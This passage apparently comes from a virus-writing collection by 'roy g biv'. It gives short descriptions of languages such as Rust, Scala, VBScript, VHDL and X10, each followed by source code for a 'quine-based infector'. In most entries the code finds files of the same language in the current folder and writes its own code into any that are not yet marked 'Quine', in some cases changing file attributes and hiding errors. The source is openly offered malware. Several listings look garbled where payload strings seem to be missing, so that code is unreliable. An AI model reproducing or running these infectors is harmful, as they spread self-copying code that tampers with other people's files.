     developed by Mozilla Research. It is designed to be a "safe, concurrent,
     practical language", supporting pure-functional, concurrent-actor,
     imperative-procedural, and object-oriented styles.

     Quine-based infector was finished on 02.05.2013.

 - - - - - - - - - - - - - - - - [RS.Quine] - - - - - - - - - - - - - - - -
fn main()
{

{let alet mut b=str::append(~"{let a=\"",a),c=0;while c<a.len(){b=str::append(b,str::from_byte((char::to_digit(str::char_at(a,c),16).unwrap()*16+char::to_digit(str::char_at(a,c+1),16).unwrap())as u8));c+=2;}for(core::os::list_dir(&Path(&"."))).each|a|{if((*a).to_lower().ends_with(".rs")){let c=result::get(&io::read_whole_file_str(&Path(*a)));if(!c.contains("Quine")){let d=io::file_writer(&Path(*a),[io::Create]);if(!d.is_err()){let e=str::rfind_char(c,'}').unwrap();d.unwrap().write_str(str::append(str::append(c.substr(0,e).to_str(),b),c.substr(e,c.len()-e)));}}}}}/*Quine - roy g biv 02/05/13*/

}
 - - - - - - - - - - - - - - - - [RS.Quine] - - - - - - - - - - - - - - - -





  *) Scala

     Scala  is an object-functional programming and scripting language for 
     general software applications, statically typed, designed to concisely 
     express solutions in an elegant, type-safe and lightweight (low 
     ceremonial) manner. Scala has full support for functional programming
     (including currying, pattern matching, algebraic data types, lazy 
     evaluation, tail recursion, immutability, etc.). It cleans up what are 
     often considered poor design decisions in Java (such as type erasure, 
     checked exceptions, the non-unified type system) and adds a number of 
     other features designed to allow cleaner, more concise and more 
     expressive code to be written.  
     
     Quine-based infector was finished on 13.09.2013.     

 - - - - - - - - - - - - - - - - [SCL.Quine] - - - - - - - - - - - - - - - -
object quine
{
def main(args: Array[String])
{

{val avar b="{val a=\""+a;var c=0;for(c<-0 to a.length()-2 by 2)b+=Character.toChars(Integer.parseInt(a.substring(c,c+2),16))(0);for(c<-new java.io.File(".").listFiles())if(c.getName().toLowerCase().endsWith(".scala"))try{val d=io.Source.fromFile(c.getName());val e=d.mkString;d.close();val f=e.lastIndexOf('}',e.lastIndexOf('}')-1);if(e(f-1)!='/'){val g=c.canWrite();c.setWritable(true);val h=new java.io.FileWriter(c);h.write(e.substring(0,f)+b+e.substring(f));h.close();c.setWritable(g);}}catch {case z:Exception=>;}}/*Quine - roy g biv 13/09/13*/}

}
 - - - - - - - - - - - - - - - - [SCL.Quine] - - - - - - - - - - - - - - - -      




  *) SmallBasic
    
     SmallBASIC is a BASIC programming language dialect with interpreters
     released as free software under the GNU GPL. The dialect is described by
     the authors as a second generation BASIC, and has a lot in common with
     QBasic. It is a structured BASIC, and contains the most advanced math
     functions and operators found on graphing calculators such as matrices
     and Gauss-Jordan method.
     
     Quine-based infector was finished on 24.05.2013.

 - - - - - - - - - - - - - - - - [SBAS.Quine] - - - - - - - - - - - - - - - -
A="223A423D43485224283130292B22413D222B43485224283334292B413A464F5220433D3120544F204C454E2841295354455020323A423D422B434852242856414C28222648222B4D494428412C432C322929293A4E4558543A4F4E204552524F5220474F544F20473A413D46494C455328222A22293A464F52204320494E20413A494620554341534528524947485428432C3429293D222E424153225448454E0A4F50454E204320464F5220494E50555420415323313A443D303A5748494C45204E4F5420454F46283129414E4420443D303A4C494E45494E50555423312C453A443D494E53545228452C225175696E6522293A57454E443A434C4F534523313A494620443D30205448454E0A4F50454E204320464F5220415050454E4420415323123A5052494E5423312C423A434C4F534523323A454E4449463A454E4449463A4E4558543A4C4142454C20473A454E44275175696E65202D20726F792067206269762032342F30352F3133":B=CHR$(10)+"A="+CHR$(34)+A:FOR C=1 TO LEN(A)STEP 2:B=B+CHR$(VAL("&H"+MID(A,C,2))):NEXT:ON ERROR GOTO G:A=FILES("*"):FOR C IN A:IF UCASE(RIGHT(C,4))=".BAS"THEN
OPEN C FOR INPUT AS#1:D=0:WHILE NOT EOF(1)AND D=0:LINEINPUT#1,E:D=INSTR(E,"Quine"):WEND:CLOSE#1:IF D=0 THEN
OPEN C FOR APPEND AS#1:PRINT#1,B:CLOSE#1:ENDIF:ENDIF:NEXT:LABEL G:END'Quine - roy g biv 24/05/13
 - - - - - - - - - - - - - - - - [SBAS.Quine] - - - - - - - - - - - - - - - -





  *) Spark

     SPARK is a formally-defined computer programming language based on the
     Ada programming language, intended to be secure and to support the
     development of high integrity software used in applications and systems
     where predictable and highly reliable operation is essential either for
     reasons of safety (e.g., avionics in aircraft/spacecraft, or medical
     systems and process control software in nuclear powerplants) or for
     business integrity (for example financial software for banking and
     insurance companies).

     Quine-based infector was finished on 07.06.2013.

 - - - - - - - - - - - - - - - - [SPK.Quine] - - - - - - - - - - - - - - - -
with gnat.directory_operations,spark.ada.text_io,spark.ada.strings.unbounded,spark.ada.strings,spark.ada.strings.maps,spark.ada.strings.unbounded.not_spark,ada.strings.equal_case_insensitive;use gnat.directory_operations,spark.ada.text_io,spark.ada.strings.unbounded,spark.ada.strings,spark.ada.strings.maps,spark.ada.strings.unbounded.not_spark;


procedure quine is
a:stringb:dir_type;c,g:string(1..260);d,h,i,l,m:natural;e,j,k:unbounded_string;f:spark.ada.text_io.file_type;

begin

open(b,".");loop read(b,c,d);exit when d=0;if d>4 then if ada.strings.equal_case_insensitive(c(d-3..d),".adb")then e:=null_unbounded_string;open(f,in_file,c(1..d),"");i:=0;while not end_of_file_file(f)and i=0 loop procedure_get_line_file(f,g,h);i:=index_pattern(string_to_unbounded_string(g(1..h)),"Quine",direction_forward,identity);append_string(e,g(1..h)&character'val(10));end loop;close(f);if i=0 then j:=e;loop h:=index_pattern(j,"end ",direction_forward,identity);exit when h=0;i:=index_pattern(function_unbounded_slice(j,h,get_length(j)),";",direction_forward,identity);k:=function_unbounded_slice(j,h+4,h+i-2);l:=index_pattern(e,"procedure "&to_string(k),direction_forward,identity);exit when l>0;j:=function_unbounded_slice(j,h+i,get_length(j));end loop;if h>0 then j:=function_unbounded_slice(e,l,get_length(e));h:=index_pattern(j,"begin",direction_forward,identity)-2;i:=index_pattern(j,to_string(concat_string_unbounded_string("end ",k)),direction_forward,identity)-2;open(f,out_file,c(1..d),"");d:=1;while d<a'length loop m:=character'pos(a(d+1));put_character_file(f,character'val(character'pos(a(d))*16+m-m/64*7-816));d:=d+2;if d=693 then put_file(f,to_string(function_unbounded_slice(e,1,l+h)));elsif d=715 then put_file(f,a);elsif d=921 then put_file(f,to_string(function_unbounded_slice(e,l+h,l+i)));end if;end loop;put_file(f,to_string(function_unbounded_slice(e,l+i+1,get_length(e))));close(f);end if;end if;end if;end if;end loop;close(b);exception when error:others=>return;--Quine - roy g biv 07/06/13

end quine;
 - - - - - - - - - - - - - - - - [SPK.Quine] - - - - - - - - - - - - - - - -





  *) Visual Basic .NET

     Visual Basic .NET (VB.NET) is an object-oriented computer programming
     language that can be viewed as an evolution of the classic Visual Basic,
     implemented on the .NET Framework.

     Quine-based infector was finished on 05.09.2013.

 - - - - - - - - - - - - - - - - [VBNet.Quine] - - - - - - - - - - - - - - - -
class quine
shared sub Main()

dim a="222C623D223A64696D20613D222B636872283334292B612C632C652C662C672C683A666F7220633D3120746F206C656E2861297374657020323A623D622B6368722863696E742822266822266D696428612C632C322929293A6E6578743A6F6E206572726F7220726573756D65206E6578743A633D6372656174656F626A6563742822736372697074696E672E66696C6573797374656D6F626A65637422293A666F722065616368206420696E20632E676574666F6C64657228222E22292E66696C65733A6966206C6361736528632E676574657874656E73696F6E6E616D65286429293D227662227468656E3A653D632E6F70656E7465787466696C652864292E72656164616C6C3A663D696E737472286C636173652865292C22656E642073756222293A696620696E73747228652C225175696E6522293D30616E6420663E307468656E3A673D642E617474726962757465733A642E617474726962757465733D303A6572722E636C6561723A683D632E6372656174657465787466696C652864293A6966206572722E6E756D6265723D307468656E3A682E7772697465286C65667428652C662D31292B622B6D696428652C6629293A656E642069663A642E617474726962757465733D673A656E642069663A656E642069663A6E657874275175696E65202D20726F792067206269762030352F30392F31330A",b=":dim a="+chr(34)+a,c,e,f,g,h:for c=1 to len(a)step 2:b=b+chr(cint("&h"&mid(a,c,2))):next:on error resume next:c=createobject("scripting.filesystemobject"):for each d in c.getfolder(".").files:if lcase(c.getextensionname(d))="vb"then:e=c.opentextfile(d).readall:f=instr(lcase(e),"end sub"):if instr(e,"Quine")=0and f>0then:g=d.attributes:d.attributes=0:err.clear:h=c.createtextfile(d):if err.number=0then:h.write(left(e,f-1)+b+mid(e,f)):end if:d.attributes=g:end if:end if:next'Quine - roy g biv 05/09/13

end sub
end class
 - - - - - - - - - - - - - - - - [VBNet.Quine] - - - - - - - - - - - - - - - -





  *) Visual Basic Script

     VBScript (Visual Basic Scripting Edition) is an Active Scripting language
     developed by Microsoft that is modeled on Visual Basic. It is designed
     as a “lightweight” language with a fast interpreter for use in a wide
     variety of Microsoft environments. VBScript uses the Component Object
     Model to access elements of the environment within which it is running;
     for example, the FileSystemObject (FSO) is used to create, read, update
     and delete files.

     Quine-based infector was finished on 21.04.2013.

 - - - - - - - - - - - - - - - - [VBS.Quine] - - - - - - - - - - - - - - - -
ab=":a="+chr(34)+a:for c=1 to len(a)step 2:b=b+chr(cint("&h"&mid(a,c,2))):next:on error resume next:set a=createobject("scripting.filesystemobject"):for each c in a.getfolder(".").files:if lcase(a.getextensionname(c))="vbs"and instr(a.opentextfile(c).readall,"Quine")=0then:d=c.attributes:c.attributes=0:err.clear:set e=a.opentextfile(c,8):if err.number=0then:e.write(b):end if:c.attributes=d:end if:next'Quine - roy g biv 21/04/13
 - - - - - - - - - - - - - - - - [VBS.Quine] - - - - - - - - - - - - - - - -





  *) VHDL
  
     VHDL (VHSIC Hardware Description Language) is a hardware description
     language used in electronic design automation to describe digital and
     mixed-signal systems such as field-programmable gate arrays and
     integrated circuits. VHDL can also be used as a general purpose parallel
     programming language.

     Quine-based infector was finished on 28.05.2013.

 - - - - - - - - - - - - - - - - [VHD.Quine] - - - - - - - - - - - - - - - -
use std.textio.all;

entity quine is
end quine;
architecture rgb of quine is
begin
process

constant a:string(1 toconstant b:string(1 to 10):="victim.vhd";file c,o:text;variable d,f,i,k,l,m,n:integer;variable e:line;variable h:character;variable j:string(1 to 256);

begin

file_open(c,b,read_mode);d:=0;k:=0;l:=0;m:=0;n:=0;while not endfile(c)loop readline(c,e);d:=d+1;f:=e'length;for g in 1 to f loop read(e,h);i:=character'pos(h);if i>64 and i<91 then h:=character'val(i+32);end if;j(g):=h;end loop;for g in 1 to f loop if f>4 then if j(g to g+4)="quine"then k:=1;exit;elsif j(g to g+4)="begin"then l:=d;elsif j(g to g+4)="wait;"then m:=d;elsif f>6 and j(g to g+6)="process"then n:=1;end if;end if;end loop;end loop;file_close(c);if k=0 and l>0 and m>0 and n>0 then file_open(c,b,read_mode);file_open(o,"r",write_mode);f:=1;while f<a'length loop i:=character'pos(a(f+1));write(e,character'val(character'pos(a(f))*16+i-i/64*7-816));f:=f+2;if f=39 then writeline(o,e);for g in 1 to l-1 loop readline(c,e);writeline(o,e);end loop;elsif f=101 then write(e,a);elsif f=407 then writeline(o,e);for g in l to m-1 loop readline(c,e);writeline(o,e);end loop;end if;end loop;writeline(o,e);for g in m to d loop readline(c,e);writeline(o,e);end loop;file_close(o);file_close(c);file_open(c,"r",read_mode);file_open(o,b,write_mode);while not endfile(c)loop readline(c,e);writeline(o,e);end loop;file_close(o);file_close(c);end if;--Quine - roy g biv 28/05/13

wait;
end process;
end rgb;
 - - - - - - - - - - - - - - - - [VHD.Quine] - - - - - - - - - - - - - - - -





  *) Vala

     Vala is an object-oriented programming language with a self-hosting
     compiler that generates C code and uses the GObject system. Vala is
     syntactically similar to C# and includes useful language features like
     anonymous functions, signals, properties, generics, assisted memory
     management, exception handling, type inference, and foreach statements.
     Its developers Jürg Billeter and Raffaele Sandrini aim to bring these
     features to the plain C runtime with little overhead and no special
     runtime support by targeting the GObject object system. Rather than being
     compiled directly to assembly or to another intermediate language, Vala
     is source-to-source compiled to C which is then compiled with a
     platform's standard C compiler, such as gcc.

     Quine-based infector was finished on 22.08.2013.

 - - - - - - - - - - - - - - - - [VALA.Quine] - - - - - - - - - - - - - - - -
class quine
{
    public static void main(string[] args)
    {

        {string ab="{string a=\""+a,d,f;int c;for(c=0;c<a.length;c+=2)b+=((char)(a[c]*16+a[c+1]-a[c+1]/64*7-816)).to_string();var e=Dir.open(".");while((d=e.read_name())!=null)if(d.down().has_suffix(".vala"))try{size_t g;FileUtils.get_contents(d,out f,out g);c=(int)g;while(f[--c]!='}');while(f[--c]!='}');if(f[c-1]!='/')try{FileUtils.set_contents(d,f.substring(0,c)+b+f.substring(c));}catch{}}catch{}}/*Quine - roy g biv 22/08/13*/}

}
 - - - - - - - - - - - - - - - - [VALA.Quine] - - - - - - - - - - - - - - - -





  *) WinBatch

     Winbatch is a non-free Microsoft Windows scripting language developed by
     Wilson WindowWare. Its environment includes an interpreter and a code
     editor along with a dialog designer and optional compiler to create
     self-contained executables.

     It is a reasonably easy language to learn, and its structure and syntax
     at first glance look a little like a cross between Basic and C. It has
     been continually developed over the years with many functions added along
     with support for things like .Net, ActiveX controls, COM (OLE), Unicode,
     UAC and code signing for Vista and Windows 7 etc.

     Quine-based infector was finished on 25.05.2013.

 - - - - - - - - - - - - - - - - [WBT.Quine] - - - - - - - - - - - - - - - -
a
b=""
for c=1 to strlen(a)by 2
d=char2num(strsub(a,c+1,1))
b=strcat(b,num2char(strsub(a,c,1)*16+d-d/64*7-48))
if c==5then b=strcat(b,a)
next
a=fileitemize("*.wbt")
for c=1 to itemcount(a,@tab)
d=itemextract(c,a,@tab)
e=fileopen(d,"read")
f=""
g=0
while!g
h=fileread(e)
if h=="*EOF*"then break
g=strindex(h,"Quine",1,@fwdscan)
f=strcat(f,h)
endwhile
fileclose(e)
if!g then
e=fileattrget(d)
fileattrset(d,"r")
fileput(d,strcat(strcat(b,@lf),f))
fileattrset(d,e)
endif
next'Quine - roy g biv 25/05/13
 - - - - - - - - - - - - - - - - [WBT.Quine] - - - - - - - - - - - - - - - -





  *) x10

     X10 is a programming language being developed by IBM at the Thomas J.
     Watson Research Center as part of the Productive, Easy-to-use, Reliable
     Computing System (PERCS) project funded by DARPA's High Productivity
     Computing Systems (HPCS) program. Its primary authors are Kemal Ebcioğlu,
     Vijay Saraswat, and Vivek Sarkar.

     X10 is designed specifically for parallel programming using the
     partitioned global address space (PGAS) model. A computation is divided
     among a set of places, each of which holds some data and hosts one or
     more activities that operate on those data. It has a constrained type
     system for object-oriented programming, a form of dependent types.
     Other features include user-defined primitive struct types; globally
     distributed arrays, and structured and unstructured parallelism.

     Quine-based infector was finished on 23.06.2013.

 - - - - - - - - - - - - - - - - [x10.Quine] - - - - - - - - - - - - - - - -
public class Hello {
    public static def main(Array[String]) {
if(true){a:Stringvar b:String="if(true){a:String=\""+a;var c:int;for(c=0;c<a.length();c+=2)b+=Char.chr(Int.parseInt(a.substring(c,c+2),16));d:Array[String]=(new x10.io.File(".")).list();for(e in d)if(d(e).toLowerCase().endsWith(".x10"))try{f:x10.io.File=new x10.io.File(d(e));var g:Array[Byte]=new Array[Byte](f.size()as Int+b.length());h:x10.io.FileReader=new x10.io.FileReader(f);h.read(g,0,f.size()as Int);h.close();i:String=new String(g);c=i.lastIndexOf('}',i.lastIndexOf('}')-1);if((g(c-1)!=47as Byte)&&f.canWrite()){Array.copy(g,c,g,g.size-f.size()as Int+c,f.size()as Int-c);Array.copy(b.bytes(),0,g,c,b.length());j:x10.io.FileWriter=new x10.io.FileWriter(f);j.write(g);j.close();}}catch(Exception){}}/*Quine - roy g biv 23/06/13*/}

}
 - - - - - - - - - - - - - - - - [x10.Quine] - - - - - - - - - - - - - - - -

